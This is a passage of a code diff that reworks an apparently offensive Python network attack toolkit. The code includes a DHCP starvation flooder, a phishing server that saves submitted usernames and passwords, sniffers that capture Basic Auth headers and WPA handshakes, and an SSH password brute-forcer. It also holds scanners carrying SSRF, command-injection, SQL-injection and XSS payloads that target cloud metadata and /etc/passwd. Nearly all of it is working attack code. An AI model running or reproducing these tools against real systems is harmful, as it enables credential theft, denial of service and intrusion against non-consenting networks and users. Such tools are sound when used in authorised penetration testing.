 
     # ---- DHCP Starvation ----
-    async def dhcp_starvation(self, target, duration=30, pps=10, **kwargs):
+    async def dhcp_starvation(self, target=None, duration=30, pps=10, **kwargs):
         name = "dhcp_starvation"
         att = self.registry.create(name)
-        self.log.add(f"DHCP starvation {target}", tag="ATTACK")
+        self.log.add(f"DHCP starvation @ {pps} pps", tag="ATTACK")
         def gen():
             while True:
                 mac = Utils.rand_mac()
-                mac_bytes = bytes.fromhex(mac.replace(":", ""))
-                chaddr = mac_bytes + b"\x00" * (16 - len(mac_bytes))
-                yield Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
-                      IP(src="0.0.0.0", dst="255.255.255.255") / \
-                      UDP(sport=68, dport=67) / \
-                      Raw(b"\x01\x01\x06\x00" + b"\x00"*8 + chaddr + b"\x00"*10)
+                hw = bytes.fromhex(mac.replace(":", ""))
+                yield (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+                       IP(src="0.0.0.0", dst="255.255.255.255") /
+                       UDP(sport=68, dport=67) /
+                       BOOTP(chaddr=hw, xid=random.randint(1, 0xFFFFFFFF), flags=0x8000) /
+                       DHCP(options=[("message-type", "discover"), "end"]))
         await self.engine.send_loop(gen(), duration, pps, name, layer2=True)
         return att
 
     # ---- Social Engineering ----
-    async def start_phishing_server(self, bind_ip="0.0.0.0", port=8080, credential_file="creds.txt", duration=60, **kwargs):
+    async def start_phishing_server(self, bind_ip="0.0.0.0", port=8080,
+                                    credential_file=None, duration=60, **kwargs):
         from aiohttp import web
         name = "phishing"
         att = self.registry.create(name)
-        self.log.add(f"Phishing server on {bind_ip}:{port}", tag="SOCIAL")
-        creds = []
+        if credential_file is None:
+            out = self.engine.config.output_dir
+            try:
+                out.mkdir(parents=True, exist_ok=True)
+            except Exception:
+                out = Path(".")
+            credential_file = str(out / "captured_creds.txt")
+        self.log.add(f"Phishing server on {bind_ip}:{port} -> {credential_file}", tag="SOCIAL")
 
         async def handle_login(request):
             data = await request.post()
             username = data.get("username", "")
             password = data.get("password", "")
-            creds.append((username, password))
-            with open(credential_file, "a") as f:
-                f.write(f"{username}:{password}\n")
+            try:
+                with open(credential_file, "a", encoding="utf-8") as f:
+                    f.write(f"{datetime.datetime.now().isoformat()}\t{username}\t{password}\n")
+                att.add_finding({"username": username})
+                att.inc_recv(1)
+                self.log.add(f"Phishing: captured submission for '{username}'", tag="SOCIAL")
+            except Exception as e:
+                self.log.add(f"Phishing: write failed ({e})", level="error")
             return web.Response(text="Login failed", status=401)
 
-        app = web.Application()
-        app.router.add_post("/login", handle_login)
-        runner = web.AppRunner(app)
-        await runner.setup()
-        site = web.TCPSite(runner, bind_ip, port)
-        await site.start()
-        self.log.add(f"Phishing site running at http://{bind_ip}:{port}/login", tag="SOCIAL")
-        await asyncio.sleep(duration)
-        await runner.cleanup()
-        att.stop()
+        runner = None
+        try:
+            app = web.Application()
+            app.router.add_post("/login", handle_login)
+            runner = web.AppRunner(app)
+            await runner.setup()
+            await web.TCPSite(runner, bind_ip, port).start()
+            self.log.add(f"Phishing site at http://{bind_ip}:{port}/login", tag="SOCIAL")
+            await self._sleep(att, duration)
+        except Exception as e:
+            self.log.add(f"Phishing server error: {e}", level="error")
+        finally:
+            if runner is not None:
+                await runner.cleanup()
+            att.stop()
         return att
 
     # ---- Cloud Recon ----
     async def cloud_recon(self, target_ips=None, duration=30, **kwargs):
         name = "cloud_recon"
         att = self.registry.create(name)
-        self.log.add(f"Cloud reconnaissance (checking IPs)", tag="CLOUD")
-        if target_ips is None:
+        if not target_ips:
             target_ips = [self.net.ip, self.net.gateway]
+        target_ips = [ip for ip in target_ips if ip and ip != "0.0.0.0"]
+        self.log.add(f"Cloud recon on {', '.join(target_ips)}", tag="CLOUD")
+        providers = ["amazon", "aws", "azure", "microsoft", "google", "gcp",
+                     "digitalocean", "linode", "hetzner", "ovh", "oracle", "cloudflare"]
         results = {}
-        async with aiohttp.ClientSession() as session:
+        timeout = aiohttp.ClientTimeout(total=5)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
             for ip in target_ips:
+                if not att.running:
+                    break
                 try:
-                    async with session.get(f"http://ip-api.com/json/{ip}", timeout=5) as resp:
+                    async with session.get(f"http://ip-api.com/json/{ip}") as resp:
                         data = await resp.json()
-                        org = data.get("org", "")
-                        if any(cloud in org.lower() for cloud in ["amazon", "azure", "google", "digitalocean", "linode"]):
-                            results[ip] = org
+                    org = f"{data.get('org', '')} {data.get('isp', '')} {data.get('as', '')}".strip()
+                    if any(p in org.lower() for p in providers):
+                        results[ip] = org
+                        att.add_finding({"ip": ip, "org": org})
                 except Exception:
-                    pass
+                    att.inc_errors()
                 att.inc_sent(1)
-        self.log.add(f"Cloud results: {results}", tag="CLOUD")
+        self.log.add(f"Cloud recon: {results or 'no cloud providers identified'}", tag="CLOUD")
         att.stop()
         return att
 
-    # ---- SSHTunnel (stub) ----
-    async def ssh_tunnel(self, host, username, password=None, keyfile=None, remote_port=22, local_port=1080, duration=30, **kwargs):
-        name = "ssh_tunnel"
-        att = self.registry.create(name)
-        self.log.add(f"SSH tunnel {host}:{remote_port} -> local:{local_port} (stub)", tag="TUNNEL")
-        def tunnel_thread():
-            try:
-                client = paramiko.SSHClient()
-                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                if password:
-                    client.connect(host, port=remote_port, username=username, password=password, timeout=5)
-                elif keyfile:
-                    client.connect(host, port=remote_port, username=username, key_filename=keyfile, timeout=5)
-                else:
-                    self.log.add("SSH tunnel requires password or keyfile", level="error")
-                    return
-                self.log.add(f"SSH connection established (no forwarding)", tag="TUNNEL")
-                time.sleep(duration)
-                client.close()
-            except Exception as e:
-                self.log.add(f"SSH tunnel error: {e}", level="error")
-                att.stop()
+    # ---- SSHTunnel (connection check only; port forwarding not implemented) ----
+    async def ssh_tunnel(self, host, username, password=None, keyfile=None,
+                         remote_port=22, local_port=1080, duration=30, **kwargs):
+        att = self.registry.create("ssh_tunnel")
+        self.log.add(f"SSH tunnel {host}:{remote_port} (connection check only)", tag="TUNNEL")
+
+        def connect():
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            if password:
+                client.connect(host, port=remote_port, username=username,
+                               password=password, timeout=5, allow_agent=False, look_for_keys=False)
+            elif keyfile:
+                client.connect(host, port=remote_port, username=username,
+                               key_filename=keyfile, timeout=5)
+            else:
+                raise ValueError("password or keyfile required")
+            return client
+
         loop = asyncio.get_running_loop()
-        await loop.run_in_executor(None, tunnel_thread)
-        att.stop()
+        try:
+            client = await loop.run_in_executor(None, connect)
+        except Exception as e:
+            self.log.add(f"SSH tunnel error: {e}", level="error")
+            att.stop()
+            return att
+        self.log.add("SSH connection established (port forwarding not implemented)", tag="TUNNEL")
+        try:
+            await self._sleep(att, duration)
+        finally:
+            await loop.run_in_executor(None, client.close)
+            att.stop()
         return att
 
     # ---- Passive Capture ----
@@ -1137,79 +1376,93 @@ class Attacks:
         name = "passive_capture"
         att = self.registry.create(name)
         self.log.add(f"Passive capture on {interface or 'default'}", tag="CAPTURE")
+        seen = set()
         def packet_handler(pkt):
             att.inc_recv(1)
             if pkt.haslayer(Raw):
-                data = pkt[Raw].load
-                if b"Authorization: Basic" in data:
-                    att.add_finding({"type": "Basic Auth", "data": data[:100]})
-                    self.log.add("Found Basic Auth header", tag="CAPTURE")
-        loop = asyncio.get_running_loop()
-        await loop.run_in_executor(
-            None,
-            lambda: sniff(iface=interface, timeout=duration, prn=packet_handler, store=False)
-        )
-        att.stop()
+                data = bytes(pkt[Raw].load)
+                if b"Authorization: Basic" in data and data[:64] not in seen:
+                    seen.add(data[:64])
+                    att.add_finding({"type": "Basic Auth", "data": data[:120].hex()})
+                    self.log.add("Found HTTP Basic Auth header", tag="CAPTURE")
+        try:
+            await self._run_sniff(att, iface=interface, timeout=duration, prn=packet_handler)
+        finally:
+            att.stop()
         return att
 
     # ---- Network Performance ----
     async def network_perf(self, target, port=80, duration=30, **kwargs):
-        name = "network_perf"
+        name = f"network_perf_{target}_{port}"
         att = self.registry.create(name)
         self.log.add(f"Network performance test {target}:{port}", tag="PERF")
-        start = time.time()
-        sent = 0
+        loop = asyncio.get_running_loop()
+        deadline = loop.time() + duration
         recv = 0
-        async with aiohttp.ClientSession() as session:
-            while time.time() - start < duration:
+        timeout = aiohttp.ClientTimeout(total=2)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            while att.running and not self.engine._stop.is_set() and loop.time() < deadline:
                 try:
-                    async with session.get(f"http://{target}:{port}/", timeout=2) as resp:
+                    async with session.get(f"http://{target}:{port}/") as resp:
                         data = await resp.read()
                         recv += len(data)
-                        sent += 1
                         att.inc_sent(1)
                         att.inc_recv(1)
+                        att.inc_bytes_recv(len(data))
                 except Exception:
-                    pass
-        self.log.add(f"Performance: {sent} requests, {Utils.human_size(recv)} received", tag="PERF")
+                    att.inc_errors()
+        self.log.add(
+            f"Performance: {att.packets_sent} requests, {Utils.human_size(recv)} received",
+            tag="PERF")
         att.stop()
         return att
 
     # ---- External Wrappers ----
-    async def nmap_wrapper(self, target, args="-sV", duration=30, **kwargs):
+    async def _run_external(self, att, tool, cmd, timeout):
+        """Run an external tool, killing it if it overruns `timeout` seconds."""
+        if shutil.which(cmd[0]) is None:
+            self.log.add(f"{tool}: '{cmd[0]}' not found on PATH", level="error")
+            return
+        try:
+            proc = await asyncio.create_subprocess_exec(
+                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+            )
+        except Exception as e:
+            self.log.add(f"{tool}: failed to launch ({e})", level="error")
+            return
+        try:
+            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
+        except asyncio.TimeoutError:
+            proc.kill()
+            await proc.communicate()
+            self.log.add(f"{tool}: timed out after {timeout}s, process killed", level="warn")
+            return
+        except asyncio.CancelledError:
+            proc.kill()
+            raise
+        out = stdout.decode(errors="ignore")
+        self.log.add(f"{tool} finished (exit {proc.returncode}); {len(out)} bytes output", tag="EXTERNAL")
+        att.add_finding({"tool": tool, "exit": proc.returncode,
+                         "stdout": out, "stderr": stderr.decode(errors="ignore")})
+
+    async def nmap_wrapper(self, target, args="-sV", duration=120, **kwargs):
         name = "nmap_wrapper"
         att = self.registry.create(name)
-        self.log.add(f"Running nmap on {target} with args {args}", tag="EXTERNAL")
-        cmd = ["nmap", target] + args.split()
+        self.log.add(f"nmap {target} {args}", tag="EXTERNAL")
         try:
-            process = await asyncio.create_subprocess_exec(
-                *cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
-            )
-            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=duration)
-            output = stdout.decode(errors='ignore')
-            self.log.add(f"nmap output: {output[:200]}...", tag="EXTERNAL")
-            att.add_finding({"stdout": output, "stderr": stderr.decode(errors='ignore')})
-        except Exception as e:
-            self.log.add(f"nmap error: {e}", level="error")
-        att.stop()
+            await self._run_external(att, "nmap", ["nmap", *shlex.split(args), target], duration)
+        finally:
+            att.stop()
         return att
 
-    async def sqlmap_wrapper(self, url, args="--batch", duration=30, **kwargs):
+    async def sqlmap_wrapper(self, url, args="--batch", duration=120, **kwargs):
         name = "sqlmap_wrapper"
         att = self.registry.create(name)
-        self.log.add(f"Running sqlmap on {url} with args {args}", tag="EXTERNAL")
-        cmd = ["sqlmap", "-u", url] + args.split()
+        self.log.add(f"sqlmap {url} {args}", tag="EXTERNAL")
         try:
-            process = await asyncio.create_subprocess_exec(
-                *cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
-            )
-            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=duration)
-            output = stdout.decode(errors='ignore')
-            self.log.add(f"sqlmap output: {output[:200]}...", tag="EXTERNAL")
-            att.add_finding({"stdout": output, "stderr": stderr.decode(errors='ignore')})
-        except Exception as e:
-            self.log.add(f"sqlmap error: {e}", level="error")
-        att.stop()
+            await self._run_external(att, "sqlmap", ["sqlmap", "-u", url, *shlex.split(args)], duration)
+        finally:
+            att.stop()
         return att
 
     # ---- FTP Brute (streaming, returns att) ----
@@ -1321,20 +1574,28 @@ class Attacks:
     # ---- SSRF Scanner ----
     async def ssrf_scan(self, url, params, payloads=None, **kwargs):
         if payloads is None:
-            payloads = ["http://169.254.169.254/latest/meta-data/", "http://localhost/", "http://127.0.0.1/"]
+            payloads = [
+                "http://169.254.169.254/latest/meta-data/",
+                "http://metadata.google.internal/computeMetadata/v1/",
+                "http://[::1]/", "file:///etc/passwd",
+            ]
         name = "ssrf_scan"
         att = self.registry.create(name)
         self.log.add(f"SSRF scan on {url}", tag="PENTEST")
+        # signatures that only appear if the server actually fetched an internal resource
+        signals = ("ami-id", "instance-id", "iam/security-credentials",
+                   "computeMetadata", "root:x:0:0:")
         found = []
-        async with aiohttp.ClientSession() as session:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
             for param in params:
                 for payload in payloads:
-                    data = {param: payload}
                     try:
-                        async with session.get(url, params=data, timeout=5) as resp:
+                        async with session.get(url, params={param: payload}) as resp:
                             text = await resp.text()
-                            if "aws" in text or "localhost" in text or "root" in text:
-                                found.append({"param": param, "payload": payload, "response": text[:100]})
+                        hit = next((s for s in signals if s in text), None)
+                        if hit:
+                            found.append({"param": param, "payload": payload, "signal": hit})
                     except Exception:
                         pass
         if found:
@@ -1344,21 +1605,24 @@ class Attacks:
 
     # ---- Command Injection Scanner ----
     async def cmd_injection_scan(self, url, params, payloads=None, **kwargs):
+        marker = f"nw{random.randint(100000, 999999)}"
         if payloads is None:
-            payloads = ["; ls", "| id", "&& whoami", "|| echo vulnerable"]
+            payloads = [f"; echo {marker}", f"| echo {marker}", f"&& echo {marker}",
+                        f"$(echo {marker})", "; id"]
         name = "cmd_injection_scan"
         att = self.registry.create(name)
         self.log.add(f"Command injection scan on {url}", tag="PENTEST")
         found = []
-        async with aiohttp.ClientSession() as session:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
             for param in params:
                 for payload in payloads:
-                    data = {param: payload}
                     try:
-                        async with session.get(url, params=data, timeout=5) as resp:
+                        async with session.get(url, params={param: payload}) as resp:
                             text = await resp.text()
-                            if "uid=" in text or "root" in text or "vulnerable" in text:
-                                found.append({"param": param, "payload": payload, "response": text[:100]})
+                        if marker in text or re.search(r"uid=\d+\([^)]+\) gid=\d+", text):
+                            found.append({"param": param, "payload": payload,
+                                          "response": text[:120]})
                     except Exception:
                         pass
         if found:
@@ -1403,21 +1667,42 @@ class Attacks:
                 handshake.append(pkt)
                 self.log.add("Captured EAPOL frame", tag="WIFI")
                 att.inc_recv(1)
-        loop = asyncio.get_running_loop()
-        await loop.run_in_executor(
-            None,
-            lambda: sniff(iface=iface, timeout=duration, prn=pkt_handler, store=False)
-        )
-        att.add_finding({"handshake_packets": len(handshake)})
-        self.log.add(f"Captured {len(handshake)} EAPOL frames", tag="WIFI")
-        att.stop()
+        try:
+            await self._run_sniff(att, iface=iface, timeout=duration, prn=pkt_handler)
+            att.add_finding({"handshake_packets": len(handshake)})
+            self.log.add(f"Captured {len(handshake)} EAPOL frames", tag="WIFI")
+        finally:
+            att.stop()
         return att
 
+    async def _run_sniff(self, att, timeout=30, **sniff_kwargs):
+        """
+        Run scapy sniff() off the event loop in short slices so a stop request (or
+        process exit) is honoured within ~2s instead of blocking for the full
+        capture window on a quiet link.
+        """
+        sniff_kwargs.setdefault("store", False)
+        sniff_kwargs.setdefault(
+            "stop_filter",
+            lambda _p: (not att.running) or self.engine._stop.is_set(),
+        )
+        loop = asyncio.get_running_loop()
+        end = loop.time() + max(0, timeout)
+        while att.running and not self.engine._stop.is_set():
+            slice_t = min(2.0, end - loop.time())
+            if slice_t <= 0:
+                break
+            try:
+                await loop.run_in_executor(
+                    None, lambda st=slice_t: sniff(timeout=st, **sniff_kwargs))
+            except Exception as e:
+                self.log.add(f"{att.name}: capture failed ({e})", level="error")
+                return
+
     # ---- AutoEscalate (stub) ----
-    async def auto_escalate(self, target, **kwargs):
-        name = "auto_escalate"
-        att = self.registry.create(name)
-        self.log.add(f"Auto-escalate on {target} (stub)", tag="ESCALATE")
+    async def auto_escalate(self, target=None, **kwargs):
+        att = self.registry.create("auto_escalate")
+        self.log.add("Auto-escalate is not implemented", level="warn", tag="ESCALATE")
         att.stop()
         return att
 
@@ -1432,14 +1717,14 @@ class Attacks:
             stats["bytes"] += len(pkt)
             att.inc_recv(1)
             att.inc_bytes_recv(len(pkt))
-        loop = asyncio.get_running_loop()
-        await loop.run_in_executor(
-            None,
-            lambda: sniff(iface=interface, timeout=duration, prn=pkt_handler, store=False)
-        )
-        elapsed = time.time() - stats["start"]
-        self.log.add(f"Traffic: {stats['packets']} pkts, {Utils.human_size(stats['bytes'])} in {elapsed:.1f}s", tag="MONITOR")
-        att.stop()
+        try:
+            await self._run_sniff(att, iface=interface, timeout=duration, prn=pkt_handler)
+            elapsed = max(1e-6, time.time() - stats["start"])
+            self.log.add(
+                f"Traffic: {stats['packets']} pkts, {Utils.human_size(stats['bytes'])} "
+                f"in {elapsed:.1f}s", tag="MONITOR")
+        finally:
+            att.stop()
         return att
 
     # ---- Bandwidth Meter ----
@@ -1447,17 +1732,18 @@ class Attacks:
         name = "bandwidth_meter"
         att = self.registry.create(name)
         self.log.add(f"Bandwidth meter for {duration}s", tag="MONITOR")
-        import psutil
-        counter = psutil.net_io_counters()
-        start_bytes = counter.bytes_recv + counter.bytes_sent
-        start_time = time.time()
-        await asyncio.sleep(duration)
-        counter = psutil.net_io_counters()
-        end_bytes = counter.bytes_recv + counter.bytes_sent
-        elapsed = time.time() - start_time
-        rate = (end_bytes - start_bytes) / elapsed
-        self.log.add(f"Bandwidth: {Utils.human_size(rate)}/s", tag="MONITOR")
-        att.stop()
+        try:
+            c0 = psutil.net_io_counters()
+            t0 = time.time()
+            await self._sleep(att, duration)
+            c1 = psutil.net_io_counters()
+            elapsed = max(1e-6, time.time() - t0)
+            delta = (c1.bytes_recv + c1.bytes_sent) - (c0.bytes_recv + c0.bytes_sent)
+            self.log.add(f"Bandwidth: {Utils.human_size(delta / elapsed)}/s "
+                         f"over {elapsed:.1f}s", tag="MONITOR")
+            att.add_finding({"bytes": delta, "seconds": elapsed})
+        finally:
+            att.stop()
         return att
 
     # ---- Connection Table (returns findings) ----
@@ -1465,8 +1751,12 @@ class Attacks:
         name = "connection_table"
         att = self.registry.create(name)
         self.log.add("Showing connection table", tag="MONITOR")
-        import psutil
-        connections = psutil.net_connections()
+        try:
+            connections = psutil.net_connections()
+        except Exception as e:
+            self.log.add(f"Connection table unavailable ({e})", level="error")
+            att.stop()
+            return att
         table = Table(title="Active Connections")
         table.add_column("FD", style="cyan")
         table.add_column("Family", style="green")
@@ -1478,25 +1768,22 @@ class Attacks:
             if conn.laddr and conn.raddr:
                 table.add_row(
                     str(conn.fd) if conn.fd else "-",
-                    str(conn.family),
-                    str(conn.type),
+                    getattr(conn.family, "name", str(conn.family)),
+                    getattr(conn.type, "name", str(conn.type)),
                     f"{conn.laddr.ip}:{conn.laddr.port}",
                     f"{conn.raddr.ip}:{conn.raddr.port}",
-                    conn.status
+                    conn.status,
                 )
-        from io import StringIO
         cap = StringIO()
-        cap_con = Console(file=cap, highlight=False)
-        cap_con.print(table)
+        Console(file=cap, highlight=False, width=100).print(table)
         att.add_finding({"table": cap.getvalue()})
         att.stop()
         return att
 
-    # ---- Chaos mode (stub) ----
-    async def chaos_mode(self, target, duration=30, **kwargs):
-        name = "chaos"
-        att = self.registry.create(name)
-        self.log.add(f"Chaos mode on {target} (stub)", tag="CHAOS")
+    # ---- Stubs: declared in the dispatch table but not implemented ----
+    async def chaos_mode(self, target=None, duration=30, **kwargs):
+        att = self.registry.create("chaos")
+        self.log.add("Chaos mode is not implemented", level="warn", tag="CHAOS")
         att.stop()
         return att
 
@@ -1510,82 +1797,109 @@ class Recon:
         self.log = log
         self.loop = asyncio.get_running_loop()
 
-    async def port_scan(self, host: str, ports: List[int], concurrency: int = 100, timeout: float = 2.0) -> List[int]:
+    async def port_scan(self, host: str, ports: List[int], concurrency: int = 200,
+                        timeout: float = 2.0) -> List[int]:
         sem = asyncio.Semaphore(concurrency)
         async def scan_one(p):
             async with sem:
                 try:
-                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, p), timeout=timeout)
+                    _, writer = await asyncio.wait_for(
+                        asyncio.open_connection(host, p), timeout=timeout)
                     writer.close()
-                    await writer.wait_closed()
+                    try:
+                        await writer.wait_closed()
+                    except Exception:
+                        pass
                     return p
                 except Exception:
                     return None
-        tasks = [scan_one(p) for p in ports]
-        results = await asyncio.gather(*tasks)
-        return [p for p, res in zip(ports, results) if res is not None]
+        results = await asyncio.gather(*(scan_one(p) for p in ports))
+        return sorted(p for p in results if p is not None)
 
-    async def fingerprint(self, ip: str) -> Dict:
-        def _fingerprint():
-            result = {"ip": ip, "ports": [], "banners": {}, "os": "Unknown", "ttl": None}
+    async def _banner(self, ip: str, port: int, timeout: float = 2.0) -> Optional[str]:
+        try:
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(ip, port), timeout=timeout)
+        except Exception:
+            return None
+        try:
+            if port in (80, 8080, 8000):
+                writer.write(f"HEAD / HTTP/1.0\r\nHost: {ip}\r\n\r\n".encode())
+                await writer.drain()
+            data = await asyncio.wait_for(reader.read(512), timeout=timeout)
+            return data.decode(errors="replace").strip() or None
+        except Exception:
+            return None
+        finally:
+            writer.close()
             try:
-                pkt = IP(dst=ip)/ICMP()
-                reply = sr1(pkt, timeout=2, verbose=0)
-                if reply:
-                    result["ttl"] = reply.ttl
-                    if reply.ttl <= 64:
-                        result["os"] = "Linux/Unix"
-                    elif reply.ttl <= 128:
-                        result["os"] = "Windows"
-                    else:
-                        result["os"] = "Network"
+                await writer.wait_closed()
             except Exception:
                 pass
-            common = [21,22,23,25,53,80,110,443,445,3306,3389,5900,6379,8080,8443]
-            open_ports = []
-            for p in common:
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(1)
-                    if s.connect_ex((ip, p)) == 0:
-                        open_ports.append(p)
-                        try:
-                            s.send(b"\n")
-                            banner = s.recv(256).decode(errors='replace')
-                            result["banners"][p] = banner
-                        except Exception:
-                            pass
-                    s.close()
-                except Exception:
-                    pass
-            result["ports"] = open_ports
-            return result
-        return await self.loop.run_in_executor(None, _fingerprint)
 
-    async def network_map(self, network: str, use_arp=True, use_ping=True) -> Dict:
+    async def fingerprint(self, ip: str) -> Dict:
+        result = {"ip": ip, "ports": [], "banners": {}, "os": "Unknown", "ttl": None}
+
+        def _icmp_ttl():
+            try:
+                reply = sr1(IP(dst=ip) / ICMP(), timeout=2, verbose=0)
+                return reply.ttl if reply else None
+            except Exception:
+                return None
+
+        common = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5900, 6379, 8080, 8443]
+        ttl, ports = await asyncio.gather(
+            self.loop.run_in_executor(None, _icmp_ttl),
+            self.port_scan(ip, common, timeout=2.0),
+        )
+        if ttl is not None:
+            result["ttl"] = ttl
+            # Guess the sender's initial TTL (64/128/255) allowing for a few hops.
+            if ttl <= 64:
+                result["os"] = "Linux/Unix"
+            elif ttl <= 128:
+                result["os"] = "Windows"
+            else:
+                result["os"] = "Network device"
+        result["ports"] = ports
+        banners = await asyncio.gather(*(self._banner(ip, p) for p in ports))
+        result["banners"] = {p: b for p, b in zip(ports, banners) if b}
+        return result
+
+    async def network_map(self, network: str, use_arp=True, use_ping=True,
+                          max_hosts: int = 1024) -> Dict:
+        try:
+            net = ipaddress.ip_network(network, strict=False)
+        except ValueError as e:
+            self.log.add(f"network_map: invalid network {network!r} ({e})", level="error")
+            return {}
+        hosts = [str(h) for h in net.hosts()][:max_hosts]
+
         def _map():
             devices = {}
-            net = ipaddress.IPv4Network(network, strict=False)
-            hosts = list(net.hosts())
+            if not hosts:
+                return devices
             if use_arp:
                 try:
-                    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=[str(h) for h in hosts[:100]]), timeout=2, verbose=0)
-                    for _, recv in ans:
-                        devices[recv.psrc] = {"ip": recv.psrc, "mac": recv.hwsrc, "hostname": Utils.get_hostname(recv.psrc)}
-                except Exception:
-                    pass
+                    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=hosts),
+                                 timeout=3, verbose=0)
+                    for _, r in ans:
+                        devices[r.psrc] = {"ip": r.psrc, "mac": r.hwsrc,
+                                           "hostname": Utils.get_hostname(r.psrc)}
+                except Exception as e:
+                    self.log.add(f"network_map: ARP sweep failed ({e})", level="warn")
             if use_ping:
-                for ip in hosts:
-                    if str(ip) in devices:
-                        continue
+                remaining = [h for h in hosts if h not in devices]
+                if remaining:
                     try:
-                        pkt = IP(dst=str(ip))/ICMP()
-                        reply = sr1(pkt, timeout=1, verbose=0)
-                        if reply:
-                            mac = Utils.get_mac(str(ip))
-                            devices[str(ip)] = {"ip": str(ip), "mac": mac, "hostname": Utils.get_hostname(str(ip))}
-                    except Exception:
-                        pass
+                        # one batched send/receive instead of a per-host sr1() loop
+                        ans, _ = sr([IP(dst=h) / ICMP() for h in remaining],
+                                    timeout=3, verbose=0)
+                        for _, r in ans:
+                            devices.setdefault(r.src, {"ip": r.src, "mac": None,
+                                                       "hostname": Utils.get_hostname(r.src)})
+                    except Exception as e:
+                        self.log.add(f"network_map: ping sweep failed ({e})", level="warn")
             return devices
         return await self.loop.run_in_executor(None, _map)
 
@@ -1631,16 +1945,23 @@ class Recon:
             8080: "HTTP proxy misconfig",
             27017: "MongoDB no auth"
         }
+        banners = fp.get("banners", {})
         for port in fp.get("ports", []):
             if port in vuln_map:
-                results.append({"port": port, "vulnerability": vuln_map[port], "severity": "Medium"})
+                entry = {"port": port, "vulnerability": vuln_map[port], "severity": "Medium"}
+                if banners.get(port):
+                    entry["banner"] = banners[port][:120]
+                results.append(entry)
         if 80 in fp.get("ports", []):
             try:
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(f"http://{target}", timeout=5) as resp:
+                timeout = aiohttp.ClientTimeout(total=5)
+                async with aiohttp.ClientSession(timeout=timeout) as session:
+                    async with session.get(f"http://{target}") as resp:
                         text = await resp.text()
-                        if "Welcome to nginx" in text or "Apache" in text:
-                            results.append({"port": 80, "vulnerability": "Default web page", "severity": "Low"})
+                        server = resp.headers.get("Server", "")
+                        if "Welcome to nginx" in text or "Apache" in text or server:
+                            results.append({"port": 80, "vulnerability": f"Default web page / {server}".strip(" /"),
+                                            "severity": "Low"})
             except Exception:
                 pass
         return results
@@ -1668,21 +1989,25 @@ class Pentest:
             if found:
                 return
             async with sem:
+                if found:
+                    return
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 try:
-                    client = paramiko.SSHClient()
-                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                     await self.loop.run_in_executor(
                         None,
                         lambda: client.connect(
                             host, port=port, username=username, password=pwd,
-                            timeout=self.config.ssh_timeout
+                            timeout=self.config.ssh_timeout, allow_agent=False,
+                            look_for_keys=False,
                         )
                     )
                     found = pwd
-                    self.log.add(f"Found password: {pwd}", tag="PENTEST")
-                    client.close()
+                    self.log.add(f"SSH password found: {pwd}", tag="PENTEST")
                 except Exception:
                     pass
+                finally:
+                    client.close()
 
         with open(wordlist_path, 'r') as f:
             tasks = []
@@ -1700,54 +2025,62 @@ class Pentest:
                 await asyncio.gather(*tasks, return_exceptions=True)
         return found
 
+    _SQL_ERRORS = (
+        "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
+        "quoted string not properly terminated", "pg_query()", "sqlite3::", "odbc sql server driver",
+        "ora-01756", "sqlstate", "psqlexception",
+    )
+
     async def web_sql_injection(self, url, params, payloads=None):
         if payloads is None:
-            payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "' AND SLEEP(5)--"]
+            payloads = ["'", "' OR '1'='1", "' UNION SELECT NULL--", "1' AND '1'='2"]
         self.log.add(f"SQL injection scan on {url}", tag="PENTEST")
         found = []
-        async with aiohttp.ClientSession() as session:
-            for payload in payloads:
-                for param in params:
-                    data = {param: payload}
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            for param in params:
+                for payload in payloads:
                     try:
-                        async with session.get(url, params=data, timeout=5) as resp:
-                            text = await resp.text()
-                            if "SQL" in text or "error" in text or "mysql" in text:
-                                found.append({"param": param, "payload": payload})
+                        async with session.get(url, params={param: payload}) as resp:
+                            text = (await resp.text()).lower()
+                        if any(sig in text for sig in self._SQL_ERRORS):
+                            found.append({"param": param, "payload": payload, "signal": "db error string"})
                     except Exception:
                         pass
         return found
 
     async def web_xss_scan(self, url, params, payloads=None):
         if payloads is None:
-            payloads = ["<script>alert(1)</script>", "javascript:alert(1)"]
+            payloads = ["<script>alert(1)</script>", "\"><svg onload=alert(1)>", "'><img src=x onerror=alert(1)>"]
         found = []
-        async with aiohttp.ClientSession() as session:
-            for payload in payloads:
-                for param in params:
-                    data = {param: payload}
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            for param in params:
+                for payload in payloads:
                     try:
-                        async with session.get(url, params=data, timeout=5) as resp:
+                        async with session.get(url, params={param: payload}) as resp:
                             text = await resp.text()
-                            if payload in text:
-                                found.append({"param": param, "payload": payload})
+                        # reflected verbatim (not HTML-escaped) => likely injectable
+                        if payload in text and html.escape(payload) not in text:
+                            found.append({"param": param, "payload": payload, "signal": "unescaped reflection"})
                     except Exception:
                         pass
         return found
 
